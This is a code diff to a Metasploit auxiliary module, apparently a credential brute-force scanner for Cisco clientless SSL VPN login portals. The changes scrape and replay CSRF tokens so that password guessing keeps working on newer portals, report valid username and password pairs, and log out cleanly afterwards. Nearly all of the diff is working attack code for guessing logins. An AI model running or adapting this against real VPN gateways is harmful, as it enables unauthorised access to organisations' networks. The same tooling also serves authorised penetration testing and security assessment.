@@ -62,13 +62,15 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(_ip)
     # Establish the remote host is running the clientless vpn
     res = send_request_cgi('uri' => normalize_uri('/+CSCOE+/logon.html'))
-    return unless res && res.code == 200 && res.get_cookies.include?('webvpn')
+    if res && res.code == 200 && res.get_cookies.include?('webvpn')
+      print_status('The remote target appears to host Cisco SSL VPN Service. The module will continue.')
+      print_status('Starting login brute force...')
 
-    print_status('The remote target appears to host Cisco SSL VPN Service. The module will continue.')
-    print_status('Starting login brute force...')
-
-    each_user_pass do |user, pass|
-      do_login(user, pass)
+      each_user_pass do |user, pass|
+        do_login(user, pass)
+      end
+    else
+      print_status('Cisco SSL VPN Service not detected on the remote target')
     end
   end
 
@@ -103,6 +105,10 @@ class MetasploitModule < Msf::Auxiliary
   def do_login(user, pass)
     vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
 
+    # some versions require we snag a CSRF token. So visit the logon portal
+    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('/+CSCOE+/logon.html'))
+    return unless res && res.code == 200
+
     vars_hash = {
       'tgroup' => '',
       'next' => '',
@@ -111,6 +117,20 @@ class MetasploitModule < Msf::Auxiliary
       'password' => pass,
       'Login' => 'Login'
     }
+
+    cookie = 'webvpnlogin=1'
+
+    # the web portal may or may not contain CSRF tokens. So snag the token if it exists.
+    if res.body.include?('csrf_token')
+      csrf_token = res.body[/<input name="csrf_token" type=hidden value="(?<token>[0-9a-f]+)">/, :token]
+      if csrf_token
+        vars_hash['csrf_token'] = csrf_token
+        cookie = "#{cookie}; CSRFtoken=#{csrf_token};"
+      else
+        print_error('Failed to grab the CSRF token')
+        return
+      end
+    end
 
     # only add the group if the user specifies a non-empty value
     unless datastore['GROUP'].nil? || datastore['GROUP'].empty?
@@ -121,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri('/+webvpn+/index.html'),
       'method' => 'POST',
       'ctype' => 'application/x-www-form-urlencoded',
-      'cookie' => 'webvpnlogin=1',
+      'cookie' => cookie,
       'vars_post' => vars_hash
     })
 
@@ -131,8 +151,24 @@ class MetasploitModule < Msf::Auxiliary
       print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
       report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
 
-      # logout - the default vpn connection limit is 2 so it's best to free this one up
-      send_request_cgi('uri' => normalize_uri('/+webvpn+/webvpn_logout.html'), 'cookie' => res.get_cookies)
+      # logout - the default vpn connection limit is 2 so it's best to free this one up. Unfortunately,
+      # we need a CSRF and non-CSRF version for this as well.
+      if res.body.include?('csrf_token')
+        csrf_token = res.body[/<input type="hidden" name="csrf_token" value="(?<token>[0-9a-f]+)">/, :token]
+
+        # if we don't pull out the token... just keep going? Failing logout isn't the end of the world.
+        if csrf_token
+          send_request_cgi(
+            'uri' => normalize_uri('/+webvpn+/webvpn_logout.html'),
+            'method' => 'POST',
+            'vars_post' => { 'csrf_token' => csrf_token },
+            'cookie' => res.get_cookies
+          )
+        end
+      else
+        send_request_cgi('uri' => normalize_uri('/+webvpn+/webvpn_logout.html'), 'cookie' => res.get_cookies)
+      end
+
       return :next_user
     else
       vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
